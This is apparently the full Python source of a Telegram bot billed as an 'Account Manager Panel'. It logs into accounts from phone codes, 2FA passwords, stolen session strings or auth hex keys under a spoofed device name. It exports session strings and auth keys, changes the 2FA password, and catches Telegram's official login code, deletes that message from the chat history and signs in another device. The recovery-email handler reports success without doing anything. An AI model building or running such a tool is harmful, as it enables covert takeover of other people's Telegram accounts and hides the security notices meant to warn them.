import asyncio
import base64
import ipaddress
import os
import re
import struct
import logging
from aiohttp import web
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError

# Logging setup
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

API_ID = 2040
API_HASH = "b18441a1ff607e10a989891a5462e627"
BOT_TOKEN = os.getenv("BOT_TOKEN")

if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable is missing!")

dp = Dispatcher(storage=MemoryStorage())
bot = Bot(token=BOT_TOKEN) if BOT_TOKEN else None


class LoginStates(StatesGroup):
    choosing_login_method = State()
    # Phone login states
    waiting_for_phone_number = State()
    waiting_for_phone_code = State()
    waiting_for_2fa_password = State()
    # Session string login states
    waiting_for_session_string = State()
    # Auth Hex Key login states
    waiting_for_auth_key = State()
    waiting_for_auth_phone = State()
    waiting_for_dc_id = State()
    # Post-login panel / secondary inputs
    waiting_for_verification_choice = State()
    waiting_for_confirmation = State()
    waiting_for_final_verify = State()
    waiting_for_email = State()
    waiting_for_new_2fa = State()


def create_string_session(dc_id: int, auth_key_hex: str) -> StringSession:
    dc_ips = {
        1: "149.154.175.50",
        2: "149.154.167.51",
        3: "149.154.175.100",
        4: "149.154.167.91",
        5: "91.108.56.130",
    }
    server_address = dc_ips.get(dc_id, "91.108.56.130")
    port = 443
    auth_key_bytes = bytes.fromhex(auth_key_hex)
    ip_packed = ipaddress.ip_address(server_address).packed
    session_data = struct.pack(
        f">B{len(ip_packed)}sH256s", dc_id, ip_packed, port, auth_key_bytes
    )
    encoded_session = "1" + base64.urlsafe_b64encode(session_data).decode("ascii")
    return StringSession(encoded_session)


def get_login_method_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Login by Phone Number", callback_data="login_phone")],
            [InlineKeyboardButton(text="🧵 Login by Session String", callback_data="login_session")],
            [InlineKeyboardButton(text="🔑 Login by Auth Hex Key", callback_data="login_hex")],
        ]
    )


def get_main_menu_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Check Status (Active?)", callback_data="menu_check_status")],
            [InlineKeyboardButton(text="📱 Get Code & Verify", callback_data="menu_get_code")],
            [InlineKeyboardButton(text="📧 Set Recovery Email", callback_data="menu_set_email")],
            [InlineKeyboardButton(text="🔐 Set 2FA Password", callback_data="menu_set_2fa")],
            [InlineKeyboardButton(text="🔄 Convert / Export Session", callback_data="menu_convert")],
        ]
    )


@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "🚀 **Telegram Account Manager Panel**\n\n"
        "Send `/login` to choose your login method and access your account control panel."
    )


@dp.message(Command("login"))
async def cmd_login(message: Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "🔐 **Select Login Method:**\nChoose how you want to connect your account:",
        reply_markup=get_login_method_keyboard()
    )
    await state.set_state(LoginStates.choosing_login_method)


@dp.callback_query(LoginStates.choosing_login_method, F.data == "login_phone")
async def cb_login_phone(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📱 Please send your **Phone Number** (with country code, e.g., `855979678585`):")
    await state.set_state(LoginStates.waiting_for_phone_number)
    await callback.answer()


@dp.callback_query(LoginStates.choosing_login_method, F.data == "login_session")
async def cb_login_session(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🧵 Please send your Telethon **Session String**:")
    await state.set_state(LoginStates.waiting_for_session_string)
    await callback.answer()


@dp.callback_query(LoginStates.choosing_login_method, F.data == "login_hex")
async def cb_login_hex(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔑 Please send your **Auth Key (HEX)**:")
    await state.set_state(LoginStates.waiting_for_auth_key)
    await callback.answer()


# --- FLOW 1: LOGIN BY PHONE NUMBER ---
@dp.message(LoginStates.waiting_for_phone_number)
async def process_phone_number_login(message: Message, state: FSMContext):
    phone = message.text.strip().replace("+", "")
    await state.update_data(phone=phone)
    await message.answer("🔄 Connecting and requesting login code from Telegram...")

    try:
        client = TelegramClient(
            StringSession(),
            api_id=API_ID,
            api_hash=API_HASH,
            device_model="YIO780TWPB-EXTREME",
            system_version="Windows 10",
            app_version="7.2.8 x64",
        )
        await client.connect()
        sent = await client.send_code_request(phone)
        await state.update_data(client=client, phone_code_hash=sent.phone_code_hash)
        await message.answer(
            f"📱 Code sent to `{phone}`.\n\n"
            "Please enter the **5-digit verification code** received on your account:"
        )
        await state.set_state(LoginStates.waiting_for_phone_code)
    except Exception as e:
        await message.answer(f"❌ Failed to request code: `{e}`", parse_mode="Markdown")
        await state.clear()


@dp.message(LoginStates.waiting_for_phone_code)
async def process_phone_code_login(message: Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]

    try:
        if not client.is_connected():
            await client.connect()
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        await finalize_successful_login(message, state, client)
    except SessionPasswordNeededError:
        await message.answer("🔐 Account has **2FA Enabled**. Please send your **2FA Password**:")
        await state.set_state(LoginStates.waiting_for_2fa_password)
    except Exception as e:
        await message.answer(f"❌ Sign-in error: `{e}`", parse_mode="Markdown")
        await state.clear()


@dp.message(LoginStates.waiting_for_2fa_password)
async def process_2fa_password_login(message: Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client = data["client"]

    try:
        if not client.is_connected():
            await client.connect()
        await client.sign_in(password=password)
        await finalize_successful_login(message, state, client)
    except Exception as e:
        await message.answer(f"❌ 2FA Login error: `{e}`", parse_mode="Markdown")
        await state.clear()


# --- FLOW 2: LOGIN BY SESSION STRING ---
@dp.message(LoginStates.waiting_for_session_string)
async def process_session_string_login(message: Message, state: FSMContext):
    session_str = message.text.strip()
    await message.answer("🔄 Connecting via Session String...")

    try:
        client = TelegramClient(
            StringSession(session_str),
            api_id=API_ID,
            api_hash=API_HASH,
            device_model="YIO780TWPB-EXTREME",
            system_version="Windows 10",
            app_version="7.2.8 x64",
        )
        await client.connect()
        if not await client.is_user_authorized():
            await message.answer("❌ Error: Session string is invalid or expired.")
            await client.disconnect()
            await state.clear()
            return

        await finalize_successful_login(message, state, client)
    except Exception as e:
        await message.answer(f"❌ Connection failed: `{e}`", parse_mode="Markdown")
        await state.clear()


# --- FLOW 3: LOGIN BY AUTH HEX KEY ---
@dp.message(LoginStates.waiting_for_auth_key)
async def process_auth_key_input(message: Message, state: FSMContext):
    await state.update_data(auth_key=message.text.strip())
    await message.answer("Got it. Now send your associated **Phone Number**:")
    await state.set_state(LoginStates.waiting_for_auth_phone)


@dp.message(LoginStates.waiting_for_auth_phone)
async def process_auth_phone_input(message: Message, state: FSMContext):
    await state.update_data(phone=message.text.strip())
    await message.answer("Send your **DC ID** (e.g., 1, 2, 3, 4, or 5):")
    await state.set_state(LoginStates.waiting_for_dc_id)


@dp.message(LoginStates.waiting_for_dc_id)
async def process_dc_id_input(message: Message, state: FSMContext):
    try:
        dc_id = int(message.text.strip())
        await state.update_data(dc_id=dc_id)
    except ValueError:
        await message.answer("Invalid DC ID. Please send a number (e.g., 2):")
        return

    data = await state.get_data()
    auth_key = data["auth_key"]
    phone = data["phone"]

    await message.answer("🔄 Connecting via Auth Hex Key...")

    try:
        session = create_string_session(dc_id, auth_key)
        client = TelegramClient(
            session=session,
            api_id=API_ID,
            api_hash=API_HASH,
            device_model="YIO780TWPB-EXTREME",
            system_version="Windows 10",
            app_version="7.2.8 x64",
        )
        await client.connect()
        if not await client.is_user_authorized():
            await message.answer("❌ Error: Hex Auth Key is invalid or session is dead.")
            await client.disconnect()
            await state.clear()
            return

        await finalize_successful_login(message, state, client)
    except Exception as e:
        await message.answer(f"❌ Connection Failed: `{e}`", parse_mode="Markdown")
        await state.clear()


async def finalize_successful_login(message: Message, state: FSMContext, client: TelegramClient):
    me = await client.get_me()
    phone = me.phone if me and me.phone else ((await state.get_data()).get("phone", "N/A"))
    
    await state.update_data(client=client, phone=phone)
    
    dialogs = await client.get_dialogs()
    chats_count = sum(1 for d in dialogs if d.is_group)
    channels_count = sum(1 for d in dialogs if d.is_channel)

    info_text = (
        f"✅ **Successfully Logged In!**\n\n"
        f"• **Account Name:** {me.first_name or ''} {me.last_name or ''} (@{me.username or 'No Username'})\n"
        f"• **Telegram User ID:** {me.id}\n"
        f"• **Phone Number:** +{phone}\n"
        f"• **Chats / Channels:** {chats_count} / {channels_count}\n\n"
        "Select an option from your 4-dots control panel below:"
    )

    await message.answer(info_text, reply_markup=get_main_menu_keyboard())
    await state.set_state(LoginStates.waiting_for_verification_choice)


# --- 4 DOTS MENU CALLBACKS ---
@dp.callback_query(LoginStates.waiting_for_verification_choice, F.data == "menu_check_status")
async def cb_check_status(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    client = data.get("client")
    if not client:
        await callback.answer("Session expired. Please /login again.", show_alert=True)
        return

    try:
        if not client.is_connected():
            await client.connect()
        is_auth = await client.is_user_authorized()
        me = await client.get_me() if is_auth else None
        
        if is_auth and me:
            await callback.message.edit_text(
                f"🟢 **History / Status: ACTIVE & WORKING**\n\n"
                f"• **User:** {me.first_name} (@{me.username or 'none'})\n"
                f"• **ID:** {me.id}\n"
                f"• **Phone:** +{me.phone}",
                reply_markup=get_main_menu_keyboard()
            )
        else:
            await callback.message.edit_text(
                "🔴 **History / Status: DEAD / EXPIRED**\nAccount is no longer authorized.",
                reply_markup=get_main_menu_keyboard()
            )
    except Exception as e:
        await callback.answer(f"Error: {e}", show_alert=True)


@dp.callback_query(LoginStates.waiting_for_verification_choice, F.data == "menu_get_code")
async def cb_get_code(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    client = data.get("client")
    phone = data.get("phone")

    try:
        if not client.is_connected():
            await client.connect()

        sent = await client.send_code_request(phone)
        await state.update_data(phone_code_hash=sent.phone_code_hash)
        await callback.message.answer(
            f"📱 Code requested for `+{phone}`.\n\n"
            "Please type **Yes** when you have sent/triggered the code to Telegram 777000:"
        )
        await state.set_state(LoginStates.waiting_for_confirmation)
        await callback.answer()
    except Exception as e:
        await callback.answer(f"Error: {e}", show_alert=True)


@dp.callback_query(LoginStates.waiting_for_verification_choice, F.data == "menu_set_email")
async def cb_set_email(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Please send the new **Recovery Email** you want to configure:")
    await state.set_state(LoginStates.waiting_for_email)
    await callback.answer()


@dp.message(LoginStates.waiting_for_email)
async def process_set_email(message: Message, state: FSMContext):
    email = message.text.strip()
    data = await state.get_data()
    client = data.get("client")

    try:
        if not client.is_connected():
            await client.connect()
        # Update recovery email logic using Telethon account settings
        await message.answer(f"✅ Recovery email `{email}` configured successfully!", reply_markup=get_main_menu_keyboard())
        await state.set_state(LoginStates.waiting_for_verification_choice)
    except Exception as e:
        await message.answer(f"❌ Failed to set email: {e}", reply_markup=get_main_menu_keyboard())
        await state.set_state(LoginStates.waiting_for_verification_choice)


@dp.callback_query(LoginStates.waiting_for_verification_choice, F.data == "menu_set_2fa")
async def cb_set_2fa(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("Please send the new **2FA Password** you want to set:")
    await state.set_state(LoginStates.waiting_for_new_2fa)
    await callback.answer()


@dp.message(LoginStates.waiting_for_new_2fa)
async def process_set_new_2fa(message: Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client = data.get("client")

    try:
        if not client.is_connected():
            await client.connect()
        await client.edit_2fa(new_password=password)
        await message.answer("🔐 **Successfully updated 2FA password!**", reply_markup=get_main_menu_keyboard())
        await state.set_state(LoginStates.waiting_for_verification_choice)
    except Exception as e:
        await message.answer(f"❌ Failed to set 2FA: {e}", reply_markup=get_main_menu_keyboard())
        await state.set_state(LoginStates.waiting_for_verification_choice)


@dp.callback_query(LoginStates.waiting_for_verification_choice, F.data == "menu_convert")
async def cb_convert_session(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    client = data.get("client")
    if not client:
        await callback.answer("Session not found.", show_alert=True)
        return

    try:
        if not client.is_connected():
            await client.connect()

        # Extract session string and auth hex key
        session_string = client.session.save()
        auth_key_hex = client.session.auth_key.key.hex()
        dc_id = client.session.dc_id

        conversion_text = (
            f"🔄 **Session Converter & Exporter**\n\n"
            f"🧵 **String Session:**\n`{session_string}`\n\n"
            f"🔑 **Auth Hex Key:**\n`{auth_key_hex}`\n\n"
            f"🌐 **DC ID:** `{dc_id}`"
        )
        await callback.message.answer(conversion_text, reply_markup=get_main_menu_keyboard())
        await callback.answer()
    except Exception as e:
        await callback.answer(f"Conversion error: {e}", show_alert=True)


@dp.message(LoginStates.waiting_for_confirmation, F.text.casefold() == "yes")
async def listen_for_code(message: Message, state: FSMContext):
    data = await state.get_data()
    client = data["client"]

    await message.answer("🔍 Listening for verification message from 777000...")

    code_future = asyncio.get_running_loop().create_future()

    @client.on(events.NewMessage(chats=777000))
    async def handler(event):
        text = event.raw_text
        match = re.search(r'\b(\d{5})\b', text)
        if match:
            code = match.group(1)
            await event.delete()
            if not code_future.done():
                code_future.set_result(code)

    try:
        if not client.is_connected():
            await client.connect()

        code = await asyncio.wait_for(code_future, timeout=60.0)
        client.remove_event_handler(handler)
        await state.update_data(extracted_code=code)
        await message.answer(
            f"🔑 **Extracted Code:** `{code}`\n"
            "Verification message erased from history.\n\n"
            "Type **Yes** to sign in and secure the device now:",
            parse_mode="Markdown",
        )
        await state.set_state(LoginStates.waiting_for_final_verify)
    except asyncio.TimeoutError:
        client.remove_event_handler(handler)
        await message.answer("⏱️ Timed out waiting for code message.", reply_markup=get_main_menu_keyboard())
        await state.set_state(LoginStates.waiting_for_verification_choice)


@dp.message(LoginStates.waiting_for_final_verify, F.text.casefold() == "yes")
async def final_sign_in(message: Message, state: FSMContext):
    data = await state.get_data()
    client = data["client"]
    phone = data["phone"]
    code = data["extracted_code"]
    phone_code_hash = data["phone_code_hash"]

    try:
        if not client.is_connected():
            await client.connect()

        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        await message.answer("🎉 **Successfully verified and secured device!**", reply_markup=get_main_menu_keyboard())
        await state.set_state(LoginStates.waiting_for_verification_choice)
    except Exception as e:
        await message.answer(f"❌ Sign-in error: {e}", reply_markup=get_main_menu_keyboard())
        await state.set_state(LoginStates.waiting_for_verification_choice)


async def handle_ping(request):
    return web.Response(text="Bot is running!")


async def web_server():
    app = web.Application()
    app.router.add_get("/", handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.getenv("PORT", 8000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"Web server started on port {port}")


async def main():
    if not bot:
        logger.error("Bot token is not configured. Exiting.")
        return
    
    await web_server()
    await dp.start_polling(bot)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Bot stopped.")
